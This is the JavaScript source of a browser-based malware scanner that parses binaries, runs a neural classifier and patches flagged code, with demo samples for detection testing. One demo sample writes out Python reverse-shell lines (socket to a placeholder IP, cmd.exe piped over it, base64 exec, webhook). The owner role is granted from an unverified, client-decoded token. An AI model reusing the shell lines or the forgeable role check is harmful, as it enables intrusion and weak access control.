// OpcodeShield v4.0.0 WebAssembly & PWA Client-Side Engine
// 1. opcodeshield_core.wasm (Unified Rust Core) — PE/ELF/Mach-O/APK parser, SHA-256, IOCs, YARA, CFG Graph & Surgical Patcher
// 2. OpcodeShield-SecNet-v3-int8.onnx via ONNX Runtime Web (WebGPU -> WASM SIMD fallback) — 5-head multi-label neural classifier

const THREAT_CATEGORIES = [
  "Clean / Benign", "Keylogger / Spyware", "Process Injection / RAT", "C2 / Network Dropper",
  "Persistence / Privilege", "Ransomware / Crypto", "OEP Hijack", "TLS Callback Injection",
  "Code-Cave Shellcode", "Malicious Overlay", "Proxy DLL Sideloading", "APK / DEX / ELF Injection",
];

const PATCH_STRATEGIES = [
  "NONE", "RET_ZERO", "RET_EARLY", "RET_ONE",
  "STRIP_SECTION_RESTORE_OEP", "NEUTRALIZE_TLS", "CLEAR_CAVE_OR_OVERLAY", "SANITIZE_APK",
];

const DEFAULT_BEHAVIORS = [
  "Keylogging / Input Capture", "Process Injection / Hollowing", "C2 / Network Exfiltration",
  "Persistence / Privilege Escalation", "Crypto / Ransomware", "Structural PE/ELF/Mach-O Anomaly",
  "Shellcode / PEB Walk", "Packed / Obfuscated",
];

const TOKEN_RE = /[A-Za-z_][A-Za-z0-9_.:/-]{1,48}|0x[0-9a-fA-F]+|\d+|[^\sA-Za-z0-9_]/g;

const state = {
  wasm: null,
  ortSession: null,
  ortBackend: "wasm",
  vocab: null,
  behaviors: DEFAULT_BEHAVIORS,
  maxLen: 256,
  currentBytes: null,
  currentName: "",
  lastReport: null,
  lastAi: null,
  patchLog: [],
  deferredPwaPrompt: null,
};

const $ = (id) => document.getElementById(id);
const escapeHtml = (s) => String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));

function setChip(dotId, textId, status, text) {
  $(dotId).className = "dot " + (status === "ok" ? "ok" : status === "err" ? "err" : "");
  $(textId).textContent = text;
}

const sigmoid = (x) => 1 / (1 + Math.exp(-Math.max(-60, Math.min(60, x))));
function softmax(arr) {
  const m = Math.max(...arr);
  const exps = arr.map((v) => Math.exp(v - m));
  const sum = exps.reduce((a, b) => a + b, 0) || 1;
  return exps.map((v) => v / sum);
}

function encodeSecNet(text) {
  const tokens = (text.toLowerCase().match(TOKEN_RE) || []).slice(0, state.maxLen - 2);
  const ids = new BigInt64Array(state.maxLen);
  ids[0] = 2n;
  let idx = 1;
  for (const tok of tokens) {
    const v = state.vocab[tok];
    ids[idx++] = BigInt(v !== undefined ? v : 1);
  }
  ids[idx] = 3n;
  return ids;
}

async function initRustWasm() {
  try {
    const resp = await fetch("./wasm/opcodeshield_core.wasm");
    if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
    const { instance } = await WebAssembly.instantiate(await resp.arrayBuffer(), {});
    state.wasm = instance.exports;
    setChip("wasm-dot", "wasm-status", "ok", "Rust Core WASM v4: Ready");
  } catch (err) {
    console.error("Rust WASM init failed:", err);
    setChip("wasm-dot", "wasm-status", "err", "Rust WASM: Failed");
  }
}

async function ensureOnnxAiLoaded() {
  if (state.ortSession && state.vocab) return true;
  if (typeof ort === "undefined") {
    setChip("ai-dot", "ai-status", "err", "ONNX Runtime Web unavailable");
    return false;
  }
  try {
    setChip("ai-dot", "ai-status", "loading", "Loading SecNet-v3 (INT8 ONNX)...");
    ort.env.wasm.wasmPaths = "https://cdn.jsdelivr.net/npm/onnxruntime-web@1.20.1/dist/";
    ort.env.wasm.numThreads = 1;

    const [vocabResp, modelResp] = await Promise.all([
      fetch("./models/OpcodeShield-SecNet-v3-vocab.json"),
      fetch("./models/OpcodeShield-SecNet-v3-int8.onnx"),
    ]);
    if (!vocabResp.ok || !modelResp.ok) throw new Error("Model assets fetch failed");

    const vocabJson = await vocabResp.json();
    state.vocab = vocabJson.vocab;
    state.maxLen = vocabJson.max_len || 256;
    if (Array.isArray(vocabJson.behaviors)) state.behaviors = vocabJson.behaviors;

    const modelBuf = await modelResp.arrayBuffer();
    // Prefer WebGPU if available, else WASM SIMD
    if (navigator.gpu) {
      try {
        state.ortSession = await ort.InferenceSession.create(modelBuf, { executionProviders: ["webgpu", "wasm"] });
        state.ortBackend = "WebGPU";
      } catch (_) {
        state.ortSession = await ort.InferenceSession.create(modelBuf, { executionProviders: ["wasm"] });
        state.ortBackend = "WASM SIMD";
      }
    } else {
      state.ortSession = await ort.InferenceSession.create(modelBuf, { executionProviders: ["wasm"] });
      state.ortBackend = "WASM SIMD";
    }
    setChip("ai-dot", "ai-status", "ok", `SecNet-v3 AI (${state.ortBackend}): Ready`);
    return true;
  } catch (err) {
    console.error("ONNX load failed:", err);
    setChip("ai-dot", "ai-status", "err", "SecNet-v3 AI: Error");
    return false;
  }
}

async function runSecNetInference(featureText) {
  if (!(await ensureOnnxAiLoaded())) return null;
  const ids = encodeSecNet(featureText);
  const inputTensor = new ort.Tensor("int64", ids, [1, state.maxLen]);
  const outputs = await state.ortSession.run({ input_ids: inputTensor });
  const keys = Object.keys(outputs);
  const ml = Number(outputs[keys[0]].data[0]);
  const cl = Array.from(outputs[keys[1]].data, Number);
  const sl = Array.from(outputs[keys[2]].data, Number);
  const bl = keys[3] ? Array.from(outputs[keys[3]].data, Number) : [];
  const pl = keys[4] ? Number(outputs[keys[4]].data[0]) : ml;

  const malProb = sigmoid(ml);
  const catProbs = softmax(cl);
  const stratProbs = softmax(sl);
  const isMal = malProb >= 0.5;
  let catIdx = 0, stratIdx = 0;
  if (isMal) {
    catIdx = 1 + catProbs.slice(1).indexOf(Math.max(...catProbs.slice(1)));
    stratIdx = 1 + stratProbs.slice(1).indexOf(Math.max(...stratProbs.slice(1)));
  }
  const activeBehaviors = [];
  let topBeh = null;
  bl.forEach((v, i) => {
    const p = sigmoid(v);
    if (state.behaviors[i]) {
      if (!topBeh || p > topBeh.conf) topBeh = { label: state.behaviors[i], conf: p };
      if (p >= 0.35) activeBehaviors.push({ label: state.behaviors[i], conf: p });
    }
  });
  if (isMal && !activeBehaviors.length && topBeh) activeBehaviors.push(topBeh);

  return {
    model: "OpcodeShield-SecNet-v3",
    backend: state.ortBackend,
    is_malicious: isMal,
    malicious_probability: malProb,
    ai_risk_score: Math.round(malProb * 100),
    category: isMal ? THREAT_CATEGORIES[catIdx] : "Clean / Benign",
    category_confidence: catProbs[catIdx],
    patch_strategy: isMal ? PATCH_STRATEGIES[stratIdx] : "NONE",
    strategy_confidence: stratProbs[stratIdx],
    behaviors: isMal ? activeBehaviors : [],
    patch_urgency: Math.round(sigmoid(pl) * 100),
  };
}

function analyzeWithRustWasm(bytes, filename) {
  const e = state.wasm;
  const nameBytes = new TextEncoder().encode(filename);
  const pBuf = e.wasm_alloc(bytes.length);
  const pName = e.wasm_alloc(nameBytes.length);
  new Uint8Array(e.memory.buffer, pBuf, bytes.length).set(bytes);
  new Uint8Array(e.memory.buffer, pName, nameBytes.length).set(nameBytes);
  const rLen = e.wasm_analyze_binary(pBuf, bytes.length, pName, nameBytes.length);
  const jsonStr = new TextDecoder().decode(new Uint8Array(e.memory.buffer, e.wasm_result_ptr(), rLen));
  e.wasm_free(pBuf, bytes.length);
  e.wasm_free(pName, nameBytes.length);
  return JSON.parse(jsonStr);
}

function patchWithRustWasm(bytes, offset, strategyCode, patchLen) {
  const e = state.wasm;
  const pBuf = e.wasm_alloc(bytes.length);
  new Uint8Array(e.memory.buffer, pBuf, bytes.length).set(bytes);
  const rLen = e.wasm_patch_at(pBuf, bytes.length, offset, strategyCode, patchLen);
  const jsonStr = new TextDecoder().decode(new Uint8Array(e.memory.buffer, e.wasm_result_ptr(), rLen));
  const patchedCopy = new Uint8Array(e.memory.buffer, pBuf, bytes.length).slice();
  e.wasm_free(pBuf, bytes.length);
  return { result: JSON.parse(jsonStr), patchedBytes: patchedCopy };
}

function renderCfgGraph(cfg) {
  const host = $("cfg-svg-host");
  if (!cfg || !cfg.nodes || !cfg.nodes.length) {
    host.innerHTML = `<div style="padding:18px;color:var(--muted)">Scan a binary to render its Control-Flow &amp; Call Graph.</div>`;
    return;
  }
  const nodes = cfg.nodes;
  const edges = cfg.edges || [];
  const cols = 3;
  const cellW = 240, cellH = 86;
  const pos = {};
  nodes.forEach((n, idx) => {
    const col = idx % cols;
    const row = Math.floor(idx / cols);
    pos[n.id] = { x: 24 + col * cellW, y: 24 + row * cellH };
  });
  const width = Math.max(760, cols * cellW + 40);
  const height = Math.max(260, (Math.ceil(nodes.length / cols) * cellH) + 40);

  let svg = `<svg width="${width}" height="${height}" viewBox="0 0 ${width} ${height}" xmlns="http://www.w3.org/2000/svg">`;
  svg += `<defs><marker id="arr" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M 0 1 L 10 5 L 0 9 z" fill="#64748b"/></marker></defs>`;

  edges.forEach((ed) => {
    const a = pos[ed.from], b = pos[ed.to];
    if (!a || !b) return;
    const color = ed.kind === "threat" ? "#f43f5e" : ed.kind === "import" ? "#f59e0b" : "#475569";
    svg += `<line x1="${a.x + 100}" y1="${a.y + 44}" x2="${b.x + 100}" y2="${b.y + 6}" stroke="${color}" stroke-width="1.8" marker-end="url(#arr)" />`;
  });

  nodes.forEach((n) => {
    const p = pos[n.id];
    const fill = n.kind === "malicious" ? "#3b0d1b" : n.kind === "api" ? "#2d2008" : n.kind === "entry" ? "#0b2942" : "#151f38";
    const stroke = n.kind === "malicious" ? "#f43f5e" : n.kind === "api" ? "#f59e0b" : n.kind === "entry" ? "#38bdf8" : "#818cf8";
    const lbl = escapeHtml(n.label.length > 26 ? n.label.slice(0, 25) + "…" : n.label);
    svg += `<g class="cfg-node" onclick="selectCfgNode(${n.offset}, '${escapeHtml(n.label)}')">
      <rect x="${p.x}" y="${p.y}" width="206" height="46" rx="9" fill="${fill}" stroke="${stroke}" stroke-width="1.8"/>
      <text x="${p.x + 10}" y="${p.y + 19}" fill="#f8fafc" font-size="11.5" font-family="ui-monospace,monospace" font-weight="700">${lbl}</text>
      <text x="${p.x + 10}" y="${p.y + 36}" fill="#94a3b8" font-size="10" font-family="ui-monospace,monospace">off 0x${n.offset.toString(16).toUpperCase()} • risk ${n.risk}</text>
    </g>`;
  });
  svg += `</svg>`;
  host.innerHTML = svg;
}

window.selectCfgNode = (offset, label) => {
  $("manual-offset").value = "0x" + offset.toString(16).toUpperCase();
  document.querySelectorAll(".tab-btn").forEach((b) => b.classList.remove("active"));
  document.querySelectorAll(".tab-panel").forEach((p) => p.classList.remove("active"));
  document.querySelector('[data-tab="tab-patcher"]').classList.add("active");
  $("tab-patcher").classList.add("active");
  $("cfg-selected-note").textContent = `Selected CFG node "${label}" -> loaded offset 0x${offset.toString(16).toUpperCase()} into Surgical Patcher.`;
};

function renderReport(report, aiResult) {
  state.lastAi = aiResult;
  $("results-container").style.display = "block";
  $("res-filename").textContent = report.filename;
  $("res-meta").textContent = `${report.type.toUpperCase()} (${report.arch}) • ${(report.size / 1024).toFixed(1)} KB • Entropy ${report.entropy} • Signed: ${report.signed ? "Yes" : "No"}`;
  $("res-sha256").textContent = report.sha256;

  const scoreEl = $("res-score");
  scoreEl.textContent = `${report.risk_score} / 100 (${report.severity})`;
  scoreEl.className = `metric-val sev-${report.severity}`;

  if (aiResult) {
    const aiEl = $("res-ai-verdict");
    aiEl.textContent = aiResult.is_malicious
      ? `${aiResult.category} (${(aiResult.malicious_probability * 100).toFixed(1)}%)`
      : `Clean / Benign (${((1 - aiResult.malicious_probability) * 100).toFixed(1)}%)`;
    aiEl.className = "metric-val " + (aiResult.is_malicious ? "sev-CRITICAL" : "sev-LOW");
    $("res-ai-strategy").textContent = `Strategy: ${aiResult.patch_strategy} • Patch Urgency: ${aiResult.patch_urgency}% (${aiResult.backend})`;
    $("res-behaviors").innerHTML = aiResult.behaviors.length
      ? aiResult.behaviors.map((b) => `<span class="tag danger">${escapeHtml(b.label)} ${(b.conf * 100).toFixed(0)}%</span>`).join("")
      : `<span class="tag ok">0 malicious behavioral flags</span>`;
  } else {
    $("res-ai-verdict").textContent = "Running SecNet-v3...";
    $("res-ai-strategy").textContent = "Executing ONNX Runtime...";
    $("res-behaviors").innerHTML = "";
  }

  $("res-indicators").innerHTML = report.indicators.length
    ? report.indicators.map((i) => `<div style="margin-bottom:5px">• ${escapeHtml(i)}</div>`).join("")
    : `<span class="tag ok">No malicious indicators found</span>`;

  $("res-apis").innerHTML = report.suspicious_imports.length
    ? report.suspicious_imports.map((a) => `<span class="tag danger">${escapeHtml(a)}</span>`).join("")
    : `<span class="tag ok">No suspicious APIs detected</span>`;

  $("res-iocs").innerHTML = (report.iocs && report.iocs.length)
    ? report.iocs.map((x) => `<div class="mono" style="margin-bottom:4px">• ${escapeHtml(x)}</div>`).join("")
    : `<span class="tag ok">No embedded C2 URLs or shell IOCs extracted</span>`;

  $("res-yara").innerHTML = report.yara_matches.length
    ? report.yara_matches.map((m) => `<tr><td class="mono">${escapeHtml(m.rule_name)}</td><td class="sev-${m.severity}">${m.severity}</td><td class="mono">0x${m.offset.toString(16).toUpperCase()}</td><td>${escapeHtml(m.description)}</td></tr>`).join("")
    : `<tr><td colspan="4" style="color:var(--muted)">0 YARA rules matched.</td></tr>`;

  $("res-sections").innerHTML = report.sections.length
    ? report.sections.map((s) => `<tr><td class="mono">${escapeHtml(s.name || "(unnamed)")}</td><td class="mono">0x${s.va.toString(16).toUpperCase()}</td><td class="mono">0x${s.raw_offset.toString(16).toUpperCase()}</td><td>${s.raw_size} B</td><td>${s.entropy}</td><td>${s.rwx ? '<span class="tag danger">RWX</span>' : s.executable ? '<span class="tag">EXEC</span>' : "DATA"}</td></tr>`).join("")
    : `<tr><td colspan="6" style="color:var(--muted)">No PE/ELF sections parsed.</td></tr>`;

  $("patch-candidates").innerHTML = report.patch_candidates.length
    ? report.patch_candidates.map((c, idx) => `<div style="display:flex;justify-content:space-between;align-items:center;gap:8px;padding:7px 0;border-bottom:1px solid var(--border);flex-wrap:wrap"><div><span class="tag danger">${c.strategy}</span> <span class="mono">0x${c.offset.toString(16).toUpperCase()}</span> — ${escapeHtml(c.reason)}</div><button class="btn secondary" onclick="applyCandidate(${idx})">Patch Now</button></div>`).join("")
    : `<span class="tag ok">No automatic patch targets required.</span>`;

  renderCfgGraph(report.cfg);
  $("btn-download-patched").disabled = !state.currentBytes;
  $("btn-export-html").disabled = false;
  $("btn-export-sarif").disabled = false;
}

async function handleBinary(bytes, filename) {
  if (!state.wasm) return alert("Rust WASM engine is still initializing.");
  state.currentBytes = bytes;
  state.currentName = filename;
  state.patchLog = [];
  $("patch-diff-log").textContent = "No patches applied yet.";
  const report = analyzeWithRustWasm(bytes, filename);
  state.lastReport = report;
  renderReport(report, null);
  const aiResult = await runSecNetInference(report.ai_feature_text);
  renderReport(report, aiResult);
}

window.applyCandidate = async (idx) => {
  const cand = state.lastReport?.patch_candidates?.[idx];
  if (!cand || !state.currentBytes) return;
  const code = { RET_ZERO: 0, RET_ONE: 1, RET_EARLY: 2, NOP_SLED: 3 }[cand.strategy] ?? 3;
  const { result, patchedBytes } = patchWithRustWasm(state.currentBytes, cand.offset, code, 16);
  if (result.ok) {
    state.currentBytes = patchedBytes;
    state.patchLog.push(`[PATCH] 0x${result.offset.toString(16).toUpperCase()} (${cand.strategy}): ${result.orig_hex} --> ${result.new_hex} | SHA-256: ${result.new_sha256}`);
    $("patch-diff-log").textContent = state.patchLog.join("\n");
    const updated = analyzeWithRustWasm(state.currentBytes, state.currentName);
    state.lastReport = updated;
    renderReport(updated, await runSecNetInference(updated.ai_feature_text));
  }
};

function downloadText(filename, text, mime) {
  const a = document.createElement("a");
  a.href = URL.createObjectURL(new Blob([text], { type: mime }));
  a.download = filename;
  a.click();
  URL.revokeObjectURL(a.href);
}

function buildDemoSample(kind) {
  if (kind === "benign") {
    const b = new Uint8Array(256);
    b.set([0x4d, 0x5a], 0);
    b.set([0x40, 0x00, 0x00, 0x00], 0x3c);
    b.set([0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x00, 0x00], 0x40);
    b.set(new TextEncoder().encode("OpcodeShield v4.0 Demo Benign Utility — Hello World!"), 0x90);
    return { bytes: b, name: "hello_world_clean.exe" };
  }
  if (kind === "pyrat") {
    const pyCode = [
      "import socket, subprocess, base64, pynput.keyboard",
      "WEBHOOK = 'https://discord.com/api/webhooks/123456789/demo_rat_token'",
      "s = socket.socket(); s.connect(('198.51.100.42', 4444))",
      "subprocess.Popen(['cmd.exe'], stdin=s, stdout=s, stderr=s)",
      "exec(base64.b64decode('cHJpbnQoInJhdCIp'))",
    ].join("\n");
    return { bytes: new TextEncoder().encode(pyCode), name: "suspicious_rat_client.py" };
  }
  const payload = "SetWindowsHookEx GetAsyncKeyState VirtualAllocEx WriteProcessMemory https://discord.com/api/webhooks/0000/demo keylog.txt ";
  const pBytes = new TextEncoder().encode(payload);
  const prologue = new Uint8Array([0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xec, 0x20]);
  const shellcode = new Uint8Array([0x65, 0x48, 0x8b, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00]);
  const b = new Uint8Array(176 + pBytes.length + prologue.length + shellcode.length);
  b.set([0x4d, 0x5a], 0);
  b.set([0x40, 0x00, 0x00, 0x00], 0x3c);
  b.set([0x50, 0x45, 0x00, 0x00, 0x64, 0x86, 0x00, 0x00], 0x40);
  b.set(prologue, 0x90);
  b.set(pBytes, 0x98);
  b.set(shellcode, 0x98 + pBytes.length);
  return { bytes: b, name: "simulated_keylogger.exe" };
}

function setupUI() {
  document.querySelectorAll(".tab-btn").forEach((btn) => {
    btn.addEventListener("click", () => {
      document.querySelectorAll(".tab-btn").forEach((b) => b.classList.remove("active"));
      document.querySelectorAll(".tab-panel").forEach((p) => p.classList.remove("active"));
      btn.classList.add("active");
      $(btn.dataset.tab).classList.add("active");
    });
  });

  const dz = $("dropzone"), fi = $("file-input");
  dz.addEventListener("click", () => fi.click());
  dz.addEventListener("dragover", (e) => { e.preventDefault(); dz.classList.add("dragover"); });
  dz.addEventListener("dragleave", () => dz.classList.remove("dragover"));
  dz.addEventListener("drop", async (e) => { e.preventDefault(); dz.classList.remove("dragover"); if (e.dataTransfer.files[0]) handleBinary(new Uint8Array(await e.dataTransfer.files[0].arrayBuffer()), e.dataTransfer.files[0].name); });
  fi.addEventListener("change", async (e) => { if (e.target.files[0]) handleBinary(new Uint8Array(await e.target.files[0].arrayBuffer()), e.target.files[0].name); });

  $("btn-demo-clean").addEventListener("click", (e) => { e.stopPropagation(); const s = buildDemoSample("benign"); handleBinary(s.bytes, s.name); });
  $("btn-demo-malware").addEventListener("click", (e) => { e.stopPropagation(); const s = buildDemoSample("malware"); handleBinary(s.bytes, s.name); });
  $("btn-demo-pyrat").addEventListener("click", (e) => { e.stopPropagation(); const s = buildDemoSample("pyrat"); handleBinary(s.bytes, s.name); });

  $("btn-apply-manual-patch").addEventListener("click", async () => {
    if (!state.currentBytes) return alert("Load a binary first.");
    const offStr = $("manual-offset").value.trim();
    const offset = offStr.startsWith("0x") || offStr.startsWith("0X") ? parseInt(offStr, 16) : parseInt(offStr, 10);
    if (Number.isNaN(offset) || offset < 0) return alert("Invalid file offset.");
    const { result, patchedBytes } = patchWithRustWasm(state.currentBytes, offset, parseInt($("manual-strategy").value, 10), parseInt($("manual-len").value, 10) || 8);
    if (!result.ok) return alert(result.error);
    state.currentBytes = patchedBytes;
    state.patchLog.push(`[MANUAL] 0x${result.offset.toString(16).toUpperCase()}: ${result.orig_hex} --> ${result.new_hex} | SHA-256: ${result.new_sha256}`);
    $("patch-diff-log").textContent = state.patchLog.join("\n");
    const updated = analyzeWithRustWasm(state.currentBytes, state.currentName);
    state.lastReport = updated;
    renderReport(updated, await runSecNetInference(updated.ai_feature_text));
  });

  $("btn-download-patched").addEventListener("click", () => {
    if (!state.currentBytes) return;
    const a = document.createElement("a");
    a.href = URL.createObjectURL(new Blob([state.currentBytes], { type: "application/octet-stream" }));
    a.download = "sanitized_" + (state.currentName || "binary.bin");
    a.click();
    URL.revokeObjectURL(a.href);
  });

  $("btn-export-html").addEventListener("click", () => {
    if (!state.lastReport) return;
    const r = state.lastReport, ai = state.lastAi || {};
    const htmlDoc = `<!DOCTYPE html><html><head><meta charset="utf-8"><title>OpcodeShield Report - ${escapeHtml(r.filename)}</title><style>body{background:#070b14;color:#e6eefc;font-family:system-ui,sans-serif;max-width:900px;margin:20px auto;padding:14px}.c{background:#0e1526;border:1px solid #243352;border-radius:10px;padding:14px;margin-bottom:12px}</style></head><body><h1>OpcodeShield v4.0.0 Audit Report</h1><div class="c"><h2>${escapeHtml(r.filename)} — ${r.risk_score}/100 (${r.severity})</h2><p>SHA-256: <code>${r.sha256}</code></p><p>AI Verdict: ${escapeHtml(ai.category || "N/A")} (${((ai.malicious_probability || 0) * 100).toFixed(1)}%)</p></div><div class="c"><h3>Indicators</h3><ul>${r.indicators.map((i) => `<li>${escapeHtml(i)}</li>`).join("")}</ul></div></body></html>`;
    downloadText(`opcodeshield_report_${r.filename}.html`, htmlDoc, "text/html");
  });

  $("btn-export-sarif").addEventListener("click", () => {
    if (!state.lastReport) return;
    const r = state.lastReport;
    const sarif = {
      $schema: "https://json.schemastore.org/sarif-2.1.0.json",
      version: "2.1.0",
      runs: [{
        tool: { driver: { name: "OpcodeShield", version: "4.0.0", informationUri: "https://opcodeshield.github.io/" } },
        results: [{
          ruleId: `OPCODESHIELD-${r.severity}`,
          level: r.severity === "CRITICAL" || r.severity === "HIGH" ? "error" : "warning",
          message: { text: `${r.filename}: score=${r.risk_score}/100 (${r.severity}) — ${r.indicators.join("; ")}` },
          locations: [{ physicalLocation: { artifactLocation: { uri: r.filename } } }],
        }],
      }],
    };
    downloadText(`opcodeshield_${r.filename}.sarif.json`, JSON.stringify(sarif, null, 2), "application/json");
  });

  $("btn-audit-code").addEventListener("click", async () => {
    const code = $("code-input").value.trim();
    if (!code) return;
    $("code-audit-out").textContent = "Running OpcodeShield-SecNet-v3...";
    const res = await runSecNetInference(code);
    $("code-audit-out").textContent = res ? JSON.stringify(res, null, 2) : "Failed to load ONNX Runtime Web.";
  });

  // PWA install button
  window.addEventListener("beforeinstallprompt", (e) => {
    e.preventDefault();
    state.deferredPwaPrompt = e;
    const btn = $("btn-install-pwa");
    if (btn) btn.style.display = "inline-flex";
  });
  const pwaBtn = $("btn-install-pwa");
  if (pwaBtn) {
    pwaBtn.addEventListener("click", async () => {
      if (!state.deferredPwaPrompt) return;
      state.deferredPwaPrompt.prompt();
      await state.deferredPwaPrompt.userChoice;
      state.deferredPwaPrompt = null;
      pwaBtn.style.display = "none";
    });
  }
}

// =========================================================================
// Optional Google Sign-In & Role-Based Access Control (Owner-only Traffic)
// =========================================================================
const GOOGLE_OAUTH_CLIENT_ID = "623197540254-g1044vov9ji4gi8qt2ms4q52fs5l9786.apps.googleusercontent.com";
const ROLE_REGISTRY = {
  "flaxyditto@gmail.com": "owner",
};

function decodeJwtPayload(token) {
  try {
    const b64 = token.split(".")[1].replace(/-/g, "+").replace(/_/g, "/");
    return JSON.parse(decodeURIComponent(atob(b64).split("").map((c) => "%" + ("00" + c.charCodeAt(0).toString(16)).slice(-2)).join("")));
  } catch (_) {
    return null;
  }
}

function getUserRole(email, emailVerified) {
  if (!email || !emailVerified) return "guest";
  return ROLE_REGISTRY[email.trim().toLowerCase()] || "user";
}

async function loadOwnerTrafficStats() {
  const tbody = $("owner-downloads-table");
  if (!tbody) return;
  tbody.innerHTML = `<tr><td colspan="4" style="color:var(--muted)">Fetching live GitHub traffic &amp; downloads...</td></tr>`;
  try {
    const [repoResp, relResp] = await Promise.all([
      fetch("https://api.github.com/repos/FlaxyDitto-dev/OpcodeShield"),
      fetch("https://api.github.com/repos/FlaxyDitto-dev/OpcodeShield/releases?per_page=10"),
    ]);
    const repo = repoResp.ok ? await repoResp.json() : {};
    const releases = relResp.ok ? await relResp.json() : [];

    let totalDownloads = 0;
    let latestDownloads = 0;
    const rows = [];
    releases.forEach((rel, idx) => {
      (rel.assets || []).forEach((a) => {
        const dl = Number(a.download_count || 0);
        totalDownloads += dl;
        if (idx === 0) latestDownloads += dl;
        rows.push(`<tr><td class="mono">${escapeHtml(rel.tag_name)}</td><td class="mono">${escapeHtml(a.name)}</td><td><strong>${dl}</strong></td><td>${(a.size / 1048576).toFixed(1)} MB</td></tr>`);
      });
    });

    $("stat-total-downloads").textContent = totalDownloads.toLocaleString();
    $("stat-stars-forks").textContent = `${repo.stargazers_count ?? 0} ★ / ${repo.forks_count ?? 0} ⑂`;
    $("stat-latest-downloads").textContent = latestDownloads.toLocaleString();
    tbody.innerHTML = rows.length ? rows.join("") : `<tr><td colspan="4" style="color:var(--muted)">No release assets found.</td></tr>`;
  } catch (err) {
    tbody.innerHTML = `<tr><td colspan="4" class="sev-HIGH">Failed to load stats: ${escapeHtml(err.message)}</td></tr>`;
  }
}

function applyAuthState(user) {
  const loginBtn = $("btn-google-login");
  const logoutBtn = $("btn-google-logout");
  const pill = $("auth-user-pill");
  const ownerTabBtn = $("tab-btn-owner-traffic");
  const ownerTabPanel = $("tab-owner-traffic");

  if (!user) {
    if (loginBtn) loginBtn.style.display = "inline-flex";
    if (logoutBtn) logoutBtn.style.display = "none";
    if (pill) pill.style.display = "none";
    if (ownerTabBtn) ownerTabBtn.style.display = "none";
    if (ownerTabPanel && ownerTabPanel.classList.contains("active")) {
      ownerTabPanel.classList.remove("active");
      document.querySelector('[data-tab="tab-scanner"]')?.click();
    }
    return;
  }

  const role = getUserRole(user.email, user.email_verified);
  if (loginBtn) loginBtn.style.display = "none";
  if (logoutBtn) logoutBtn.style.display = "inline-flex";
  if (pill) {
    pill.style.display = "inline-flex";
    pill.innerHTML = role === "owner"
      ? `<span class="dot ok"></span><strong style="color:#fbbf24">OWNER</strong>&nbsp;${escapeHtml(user.email)}`
      : `<span class="dot ok"></span>${escapeHtml(user.name || user.email)}`;
  }

  // Strictly show Owner Traffic tab ONLY when signed in as flaxyditto@gmail.com (role === "owner")
  if (role === "owner") {
    if (ownerTabBtn) ownerTabBtn.style.display = "inline-flex";
    if ($("owner-identity")) $("owner-identity").textContent = `Signed in as ${user.email} (Role: OWNER)`;
    loadOwnerTrafficStats();
  } else {
    if (ownerTabBtn) ownerTabBtn.style.display = "none";
  }
}

function initGoogleAuth() {
  const saved = sessionStorage.getItem("opcodeshield_auth_user");
  if (saved) {
    try { applyAuthState(JSON.parse(saved)); } catch (_) {}
  }

  const logoutBtn = $("btn-google-logout");
  if (logoutBtn) {
    logoutBtn.addEventListener("click", () => {
      sessionStorage.removeItem("opcodeshield_auth_user");
      if (window.google?.accounts?.id) window.google.accounts.id.disableAutoSelect();
      applyAuthState(null);
    });
  }

  const refreshBtn = $("btn-refresh-traffic");
  if (refreshBtn) refreshBtn.addEventListener("click", loadOwnerTrafficStats);

  const loginBtn = $("btn-google-login");
  if (loginBtn) {
    loginBtn.addEventListener("click", () => {
      let cid = GOOGLE_OAUTH_CLIENT_ID || localStorage.getItem("opcodeshield_google_client_id") || "";
      if (!cid) {
        cid = prompt(
          "Google Sign-In Setup (Owner):\nPaste your Google OAuth 2.0 Web Client ID (ending in .apps.googleusercontent.com)\nauthorized for https://opcodeshield.github.io:"
        );
        if (!cid || !cid.trim()) return;
        cid = cid.trim();
        localStorage.setItem("opcodeshield_google_client_id", cid);
      }
      if (!window.google?.accounts?.id) {
        alert("Google Sign-In library is still loading. Please try again in a moment.");
        return;
      }
      window.google.accounts.id.initialize({
        client_id: cid,
        callback: (resp) => {
          const payload = decodeJwtPayload(resp.credential);
          if (!payload || !payload.email) return;
          const user = { email: payload.email, email_verified: !!payload.email_verified, name: payload.name || payload.email };
          sessionStorage.setItem("opcodeshield_auth_user", JSON.stringify(user));
          applyAuthState(user);
        },
      });
      window.google.accounts.id.prompt();
      const slot = $("g-signin-slot");
      if (slot) {
        slot.innerHTML = "";
        window.google.accounts.id.renderButton(slot, { theme: "filled_black", size: "small", shape: "pill" });
      }
    });
  }
}

window.addEventListener("DOMContentLoaded", async () => {
  setupUI();
  initGoogleAuth();
  if ("serviceWorker" in navigator) {
    navigator.serviceWorker.register("./sw.js").catch(() => {});
  }
  await initRustWasm();
  ensureOnnxAiLoaded();
});
